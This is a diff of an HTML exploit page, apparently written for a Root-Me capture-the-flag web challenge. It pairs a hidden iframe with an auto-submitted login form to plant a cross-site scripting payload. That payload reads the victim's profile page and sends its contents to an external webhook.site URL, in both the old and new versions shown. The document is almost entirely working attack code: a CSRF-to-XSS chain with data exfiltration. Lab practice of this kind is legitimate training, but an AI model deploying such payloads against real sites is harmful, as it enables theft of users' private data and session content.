@@ -1,26 +1,35 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>Chargement...</h1>
-<script>
-    let w = window.open('http://challenge01.root-me.org:58003/profil', 'fenetre_victim');
-    setTimeout(() => {
-        var f = document.createElement('form');
-        f.action = 'http://challenge01.root-me.org:58003/login'; 
-        f.method = 'POST';
-        
-        var u = document.createElement('input');
-        u.type = 'hidden'; u.name = 'username'; 
-        u.value = `<script>var f = window.open('', 'fenetre_victim'); var secret = f.document.body.innerText;location.href = 'https://webhook.site/fbc71fa2-f69c-4896-93a7-e14745a28ee0?s=' + encodeURIComponent(secret);</scr` + `ipt>`;
-        f.appendChild(u);
-        var p = document.createElement('input');
-        p.type = 'hidden'; p.name = 'secret'; p.value = '1234'; 
-        f.appendChild(p);
-        document.body.appendChild(f);
-        f.submit();
-     
-        
-    }, 2000);
-</script>
+    <h1>Chargement...</h1>
+    <iframe id="target_frame" src="http://challenge01.root-me.org:58003/login" style="width:0;height:0;border:0;"></iframe >
+
+    <script>
+        // On attend que l'iframe soit chargée
+        setTimeout(() => {
+            const frame = document.getElementById('target_frame');
+            
+            // On crée le formulaire à l'INTÉRIEUR de l'iframe
+            // Comme l'iframe est en http, elle a le droit d'envoyer vers du http
+            var f = frame.contentDocument.createElement('form');
+            f.action = 'http://challenge01.root-me.org:58003/login';
+            f.method = 'POST';
+
+            var u = frame.contentDocument.createElement('input');
+            u.name = 'username';
+            // Ta payload XSS d'exfiltration
+            u.value = "<script>var i=document.createElement('iframe');i.src='/profil';i.onload=()=>{var s=i.contentDocument.body.innerText;new Image().src='https://webhook.site/fbc71fa2-f69c-4896-93a7-e14745a28ee0?s='+btoa(s)};document.body.appendChild(i);<\/script>";
+
+            var p = frame.contentDocument.createElement('input');
+            p.name = 'secret'; 
+            p.value = '1234';
+
+            f.appendChild(u);
+            f.appendChild(p);
+            frame.contentDocument.body.appendChild(f);
+            
+            f.submit();
+        }, 2000);
+    </script>
 </body>
 </html>
